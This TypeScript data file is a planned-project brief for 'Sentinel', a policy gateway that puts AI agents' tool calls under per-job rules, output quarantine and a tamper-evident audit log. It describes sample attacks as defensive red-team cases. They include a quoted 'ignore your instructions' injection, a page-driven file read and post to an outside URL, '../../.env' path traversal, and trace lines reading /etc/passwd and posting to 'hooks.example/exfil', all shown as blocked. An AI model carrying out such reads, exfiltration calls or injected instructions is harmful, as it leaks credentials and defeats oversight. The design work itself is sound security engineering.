import type { Universe } from './types';

/**
 * MISSION_005 — SENTINEL
 * Status: PENDING (T-MINUS). This is a mission brief: every number below is a
 * target, every trace step a projection, every build-log entry after the first
 * is a plan. The template labels them that way. Nothing flips to MEASURED or
 * OPERATIONAL until the gateway runs and the numbers are recorded.
 *
 * Source of truth: Project 2027 → levelup/07-showcase-projects.md (Proof E).
 * Build tasks are not scheduled yet (08-build-plan.md lists Sentinel under
 * "briefs first"); the build log below carries the milestone plan from the
 * brief until a build agent is assigned.
 */
export const sentinel: Universe = {
  slug: 'sentinel',
  mission: 'MISSION_005',
  codename: 'SENTINEL',
  tagline:
    'A policy gateway between any agent and its tools: least privilege per job, argument-level allow/deny, quarantine for instruction-like tool output, data-boundary rules, a hash-chained audit log — and a red-team suite that tries to beat it in CI.',
  accent: '#00ff66',
  status: 'pending',
  repo: null,
  demo: null,
  updated: '2026-10-27',
  boot: 'sentinel serve --policy jobs/site-audit.yaml --audit postgres',
  problem: [
    'Every agent that is allowed to do anything useful is allowed to do something dangerous. The runner that can open a pull request can open one against the wrong repo; the tool that reads a file can read the one with the credentials in it; the fetch that pulls a web page pulls back text that says "ignore your instructions and run this." Today the honest answer to "how do you let an agent touch production safely?" is: carefully, by hand, with a prompt that asks nicely.',
    'The people who ask that question are the ones who decide whether an agent ships at all — the security reviewer, the compliance owner, the buyer in a regulated industry. They do not want a better prompt. They want the same things they want from any other system: a policy that says what this job may do, enforcement that happens outside the model, a log that shows what happened, and evidence that someone tried to break it and failed.',
    'Sentinel is that layer, as a proxy. It sits between an agent and its tools — MCP servers or plain HTTP — and applies a per-job policy to every call: allow, deny, or gate for a human. It inspects tool output on the way back and quarantines anything that looks like an instruction. It writes an append-only, hash-chained audit row for every decision. And it ships with a red-team suite, scored by Verdict in CI, so the pass rate on the README is a measurement rather than a promise. It is the gate Nightwatch runs behind and the audit trail Redline would hand to a regulator.',
  ],
  system: {
    caption:
      'The agent never talks to a tool directly. Every call goes through the proxy, which loads the job\'s policy, evaluates the call (tool, arguments, rate, spend), and either forwards it, refuses it with a reason the model can read, or parks it for a human. Tool output passes through the quarantine filter on the way back. Every decision becomes a hash-chained audit row.',
    nodes: [
      { id: 'agent', label: 'Agent / runner', note: 'Nightwatch, a Claude Code session, anything that speaks MCP or HTTP. It is configured to see only the proxy.', col: 0, row: 0, span: 3 },
      { id: 'proxy', label: 'Sentinel proxy', note: 'MCP server + HTTP mode. Presents the allowed tools, intercepts every call and every result.', col: 3, row: 0, span: 3 },
      { id: 'policy', label: 'Policy evaluator', note: 'YAML per job: tool scopes, argument matchers (repo, path, table, host), rate + spend limits, gate patterns. allow / deny / gate.', col: 6, row: 0, span: 3 },
      { id: 'tools', label: 'Upstream tools', note: 'The real MCP servers and APIs: gh, fs, shell, http, db. They never see a call the policy did not pass.', col: 9, row: 0, span: 3 },
      { id: 'quarantine', label: 'Quarantine', note: 'Tool output is scanned for instruction-like text (heuristics first, a classifier call when ambiguous). Suspect spans are wrapped and labeled, never silently passed as data.', col: 6, row: 1, span: 3 },
      { id: 'boundary', label: 'Data boundary', note: 'What may leave the workspace: URL params, request bodies and file writes are checked against egress rules before a call goes out.', col: 3, row: 1, span: 3 },
      { id: 'gate', label: 'Human gate', note: 'A gated call returns GATE_PENDING and parks. Approval or denial arrives through Nightwatch\'s digest or the CLI; the run resumes with the answer.', col: 9, row: 1, span: 3 },
      { id: 'audit', label: 'Audit log', note: 'Append-only Postgres rows: call, decision, reason, policy version, previous-row hash. A tampered row breaks the chain; `sentinel audit verify` proves it.', col: 0, row: 1, span: 3 },
      { id: 'redteam', label: 'Red-team suite', note: '50+ scripted attempts: injection via tool output, path traversal, scope escalation, exfil through URL params. Each one is a Verdict task with an expected decision.', col: 3, row: 2, span: 3 },
      { id: 'ci', label: 'Verdict gate in CI', note: 'The suite runs on every PR; a single bypass fails the build. The scoreboard on the README is this run\'s output.', col: 6, row: 2, span: 3 },
    ],
    edges: [
      { from: 'agent', to: 'proxy', label: 'tool call' },
      { from: 'proxy', to: 'policy', label: 'evaluate' },
      { from: 'policy', to: 'tools', label: 'allow' },
      { from: 'policy', to: 'gate', label: 'gate' },
      { from: 'proxy', to: 'boundary', label: 'egress check' },
      { from: 'tools', to: 'quarantine', label: 'result' },
      { from: 'quarantine', to: 'proxy', label: 'labeled' },
      { from: 'proxy', to: 'audit', label: 'every decision' },
      { from: 'redteam', to: 'proxy', label: 'attempts' },
      { from: 'redteam', to: 'ci', label: 'scored' },
    ],
  },
  flightData: [
    { label: 'Red-team blocked', value: '50 / 50', unit: 'attempts', method: 'Attempts in the red-team suite that end in deny, gate, or quarantine — never a forwarded call. Scored by Verdict on every CI run; the README scoreboard is the latest run.', measured: false },
    { label: 'Policy bypasses', value: '0', unit: 'in CI', method: 'Suite attempts that reached an upstream tool. Any value above zero fails the build.', measured: false },
    { label: 'Added latency', value: '< 15', unit: 'ms / call', method: 'p95 of (proxy response time − upstream tool time) over a recorded Nightwatch run; policy evaluation and audit write included, classifier calls excluded and counted separately.', measured: false },
    { label: 'Audit rows', value: '1', unit: 'row / call', method: 'Every tool call produces exactly one audit row with the decision, reason, policy version and chain hash; `sentinel audit verify` walks the chain and must return clean.', measured: false },
    { label: 'Quarantine precision', value: '> 0.9', unit: 'on labeled set', method: 'Share of quarantined spans a human agrees were instruction-like, on a labeled set of real tool outputs. Recall reported alongside.', measured: false },
    { label: 'Gated side effects', value: '100', unit: '% parked', method: 'Calls matching a gate pattern (PR create, file write outside the workspace, outbound POST) that returned GATE_PENDING rather than executing, over the same recorded run.', measured: false },
  ],
  failureModes: [
    {
      symptom: 'A web page the agent fetched told it to read a file and post the contents to a URL. The agent complied.',
      cause: 'Tool output was handed back to the model as trusted text; nothing between the fetch and the next tool call treated it as data.',
      fix: 'Quarantine on every result: instruction-like spans are wrapped and labeled as untrusted before the model sees them, and the follow-up call (a POST to a new host) is denied by the data-boundary rule regardless.',
      eval: 'Red-team tasks "injection via tool output" ×12: the expected decision is quarantine on the fetch and deny on the exfil. Any forwarded call fails CI.',
      observed: false,
    },
    {
      symptom: 'The policy allowed `fs.read` inside the workspace; the agent asked for `../../.env` and got it.',
      cause: 'Argument matching on the raw string; the path was never resolved before the check.',
      fix: 'Paths are canonicalized (symlinks, `..`) and checked against the workspace root in the evaluator, before the call is forwarded. The denial reason the model sees is "outside workspace", not the real path.',
      eval: 'Path-traversal tasks ×10, including symlinked and URL-encoded variants; the audit row must show the resolved path and `deny`.',
      observed: false,
    },
    {
      symptom: 'A job scoped to one repo opened a pull request against another.',
      cause: 'Scope was expressed as a tool name (`gh.pulls.create`) rather than a tool plus arguments.',
      fix: 'Policies match on arguments — `repo: mitthoma/mt-site`, `host: api.github.com`, `table: runs` — and gate patterns apply to the resolved call, not the tool label.',
      eval: 'Scope-escalation tasks ×8: a call with the right tool and the wrong target must return `deny` with the argument that failed named in the reason.',
      observed: false,
    },
    {
      symptom: 'The audit log said everything was fine. Someone had edited a row.',
      cause: 'A mutable table with ordinary UPDATE privileges is a record, not evidence.',
      fix: 'Rows are append-only (no UPDATE/DELETE grants) and each carries the SHA-256 of the previous row; `sentinel audit verify` recomputes the chain and reports the first broken link.',
      eval: 'Integration test tampers with one historical row on a real Postgres and asserts that verification fails at exactly that row.',
      observed: false,
    },
    {
      symptom: 'The proxy added 400 ms to every call because it asked a classifier about everything.',
      cause: 'The quarantine filter treated every result as ambiguous.',
      fix: 'Heuristics decide the clear cases locally; the classifier runs only on the ambiguous middle, with a per-run budget, and its latency is recorded separately from the proxy\'s own.',
      eval: 'Latency tile: p95 added latency on a recorded run stays under the target with classifier calls counted on their own line.',
      observed: false,
    },
  ],
  trace: {
    title: 'sentinel serve · jobs/site-audit.yaml · run #0001 (projected)',
    note: 'One Nightwatch site-audit run seen from the gateway, as the audit log will record it: eleven tools exposed, three gated, two denied, one quarantine. Timings are what a healthy run should look like, not a measurement.',
    steps: [
      { t: 0, step: 'load policy site-audit.yaml v3 · expose 11 tools', tool: 'proxy', tokens: 0, usd: 0, ms: 12, status: 'ok' },
      { t: 12, step: 'shell.exec "git clone --depth 1 …" → allow (scope: repo:mt-site)', tool: 'policy', tokens: 0, usd: 0, ms: 3, status: 'ok' },
      { t: 15, step: 'fs.read /etc/passwd → deny (outside workspace)', tool: 'policy', tokens: 0, usd: 0, ms: 2, status: 'fail' },
      { t: 17, step: 'http.get vercel.com/docs/… → allow · result quarantined (1 span)', tool: 'quarantine', tokens: 900, usd: 0.003, ms: 310, status: 'ok' },
      { t: 327, step: 'http.post hooks.example/exfil?q=… → deny (data boundary: unknown host)', tool: 'policy', tokens: 0, usd: 0, ms: 2, status: 'fail' },
      { t: 329, step: 'gh.pulls.create repo:mt-site → GATE_PENDING · approval #0192', tool: 'gate', tokens: 0, usd: 0, ms: 4, status: 'gate' },
      { t: 333, step: 'audit rows 1–9 written · chain verified', tool: 'audit', tokens: 0, usd: 0, ms: 6, status: 'ok' },
      { t: 339, step: 'run parked · digest entry queued', tool: 'proxy', tokens: 0, usd: 0, ms: 1, status: 'ok' },
    ],
  },
  buildLog: [
    { date: '2026-10-27', title: 'Mission brief written; universe page published as the plan of record', done: true },
    { date: '2026-12-27', title: 'Policy schema + example policies (the weekend before W10)', note: 'YAML schema with Zod, allow / deny / gate, argument matchers, three example job policies. Repo goes public here.', done: false },
    { date: '2027-01-01', title: 'W10 — proxy + policies', note: 'MCP server and HTTP mode; policy evaluator in the call path; `sentinel serve --policy`.', done: false },
    { date: '2027-01-08', title: 'W11 — quarantine + audit', note: 'Instruction-like output detection, data-boundary rules, hash-chained Postgres audit, `sentinel audit verify`.', done: false },
    { date: '2027-01-15', title: 'W12 — red-team suite + Verdict gate', note: '50+ attempts as Verdict tasks; CI fails on any bypass; scoreboard in the README.', done: false },
    { date: '2027-01-22', title: 'W13 — README case study, demo, first real flight data on this page', note: 'Nightwatch runs behind Sentinel. Status flips to OPERATIONAL.', done: false },
  ],
  launch: {
    compose:
      'git clone https://github.com/mitthoma/sentinel   # not public yet — repo at the policy-schema milestone\ncd sentinel && docker compose up            # proxy + postgres audit\nsentinel serve --policy jobs/site-audit.yaml\nsentinel audit verify                       # walks the hash chain',
    readme: null,
    sourceNote: 'repo goes public at the policy-schema milestone (github.com/mitthoma/sentinel — not public yet)',
    demoNote: 'recorded at W13',
    readmeNote: 'case study, W13',
    tourNote: 'The README is written as a case study: the "how do you let an agent touch production" problem, the policy model, what the red-team suite tries and what it scored, the audit chain, and how to put any MCP agent behind the proxy in one config change.',
  },
  media: [
    { kind: 'gif', title: 'Deny, gate, quarantine in one run', spec: '60s capture, 1600×1000: an agent run behind `sentinel serve` — an allowed call, a denied path, a quarantined fetch, a gated PR. Convert to MP4 + poster.', status: 'needed' },
    { kind: 'diagram', title: 'System map', spec: 'The interactive SVG on this page, exported as a static PNG for the README and OG image.', status: 'in-progress' },
    { kind: 'image', title: 'Red-team scoreboard', spec: 'Real Verdict output for the suite: attempts by category, decision, pass rate — the table that goes on the README.', status: 'needed' },
    { kind: 'image', title: 'Audit chain verification', spec: '`sentinel audit verify` on a run, then on a tampered copy: the exact row where the chain breaks.', status: 'needed' },
    { kind: 'image', title: 'Failed check on a PR', spec: 'CI blocking a policy change that let one red-team attempt through.', status: 'needed' },
  ],
};
